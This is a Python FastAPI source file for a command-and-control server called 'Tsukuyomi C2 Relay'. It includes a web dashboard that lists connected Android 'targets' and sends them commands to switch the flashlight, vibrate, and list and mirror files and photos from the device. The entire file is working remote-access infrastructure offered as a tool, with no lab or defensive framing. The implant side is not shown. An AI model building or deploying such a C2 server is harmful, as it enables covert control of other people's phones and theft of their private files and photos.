from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
import json

app = FastAPI(title="Tsukuyomi C2 Relay")

connected_clients = {}
client_data = {}
dashboard_connections = []

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Tsukuyomi Advanced C2 Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
        <style>
            body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; }
            .glass-panel { background: rgba(18, 24, 36, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        </style>
    </head>
    <body class="min-h-screen pb-20 flex flex-col items-center justify-start p-4">
        <header class="w-full max-w-4xl glass-panel px-4 py-3 rounded-2xl border border-slate-800 flex items-center justify-between mb-4">
            <div class="flex items-center space-x-3">
                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-purple-600 to-cyan-400 flex items-center justify-center text-slate-950 font-bold">
                    <i class="fa-solid fa-spider"></i>
                </div>
                <div>
                    <h1 class="font-mono font-bold text-base text-white">TSUKUYOMI COMMAND CENTER</h1>
                    <p class="text-xs text-emerald-400 font-mono">Status: C2 RELAY ONLINE</p>
                </div>
            </div>
        </header>

        <main class="w-full max-w-4xl space-y-4">
            <!-- TARGET DEVICES & CONTROLS -->
            <div id="targetContainer" class="space-y-4">
                <div class="glass-panel p-4 rounded-2xl text-xs font-mono text-slate-400 text-center">
                    Waiting for targets to connect...
                </div>
            </div>
        </main>

        <script>
            const ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws/dashboard');
            ws.onmessage = function(event) {
                const data = JSON.parse(event.data);
                const container = document.getElementById('targetContainer');
                let html = '';
                
                for (const [id, info] of Object.entries(data)) {
                    html += `
                        <div class="glass-panel p-4 rounded-2xl border border-slate-800 space-y-3 font-mono text-xs">
                            <div class="flex justify-between items-center border-b border-slate-800 pb-2">
                                <span class="text-cyan-400 font-bold text-sm">Target: ${id} (${info.brand || 'Device'})</span>
                                <span class="px-2 py-0.5 bg-emerald-400/10 text-emerald-400 rounded">CONNECTED</span>
                            </div>
                            <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 text-slate-300">
                                <div><b>OS:</b> Android ${info.os || 'N/A'}</div>
                                <div><b>Battery:</b> ${info.battery || 'N/A'}%</div>
                                <div class="col-span-2"><b>Last Event:</b> ${info.event || 'Idle'}</div>
                            </div>
                            
                            <!-- HARDWARE COMMAND BUTTONS -->
                            <div class="flex flex-wrap gap-2 pt-2">
                                <button onclick="sendCommand('${id}', 'FLASHLIGHT_ON')" class="px-3 py-2 bg-amber-500/20 text-amber-400 border border-amber-500/30 rounded-xl hover:bg-amber-500/30 transition">
                                    <i class="fa-solid fa-bolt mr-1"></i> Flashlight ON
                                </button>
                                <button onclick="sendCommand('${id}', 'FLASHLIGHT_OFF')" class="px-3 py-2 bg-slate-800 text-slate-300 border border-slate-700 rounded-xl hover:bg-slate-700 transition">
                                    <i class="fa-solid fa-power-off mr-1"></i> Flashlight OFF
                                </button>
                                <button onclick="sendCommand('${id}', 'VIBRATE')" class="px-3 py-2 bg-purple-500/20 text-purple-400 border border-purple-500/30 rounded-xl hover:bg-purple-500/30 transition">
                                    <i class="fa-solid fa-vibration mr-1"></i> Vibrate
                                </button>
                                <button onclick="sendCommand('${id}', 'LIST_FILES')" class="px-3 py-2 bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 rounded-xl hover:bg-cyan-500/30 transition">
                                    <i class="fa-solid fa-folder-open mr-1"></i> Mirror Files / Photos
                                </button>
                            </div>

                            <!-- FILE VIEWER MIRROR BOX -->
                            <div id="fileViewer-${id}" class="hidden p-3 bg-slate-950 rounded-xl border border-slate-800 mt-2 max-h-40 overflow-y-auto text-slate-300">
                                <p class="text-slate-500">Click 'Mirror Files / Photos' to load target storage...</p>
                            </div>
                        </div>
                    `;
                }
                container.innerHTML = html || '<div class="glass-panel p-4 rounded-2xl text-xs font-mono text-slate-500 text-center">No active targets connected.</div>';
            };

            function sendCommand(clientId, action) {
                fetch(`/api/command/${clientId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: action })
                }).then(res => res.json()).then(resp => {
                    alert('Command Dispatched: ' + action);
                });
            }
        </script>
    </body>
    </html>
    """

@app.post("/api/command/{client_id}")
async def api_send_command(client_id: str, payload: dict):
    if client_id in connected_clients:
        ws = connected_clients[client_id]
        await ws.send_text(json.dumps(payload))
        return {"status": "success", "sent": payload}
    return {"status": "error", "message": "Client not connected"}

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    await websocket.accept()
    connected_clients[client_id] = websocket
    try:
        while True:
            data = await websocket.receive_text()
            parsed = json.loads(data)
            client_data[client_id] = parsed
            await broadcast_to_dashboards()
    except WebSocketDisconnect:
        if client_id in connected_clients:
            del connected_clients[client_id]
        if client_id in client_data:
            del client_data[client_id]
        await broadcast_to_dashboards()

@app.websocket("/ws/dashboard")
async def websocket_dashboard(websocket: WebSocket):
    await websocket.accept()
    dashboard_connections.append(websocket)
    try:
        await websocket.send_text(json.dumps(client_data))
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        dashboard_connections.remove(websocket)

async def broadcast_to_dashboards():
    payload = json.dumps(client_data)
    for dash in dashboard_connections:
        try:
            await dash.send_text(payload)
        except:
            pass
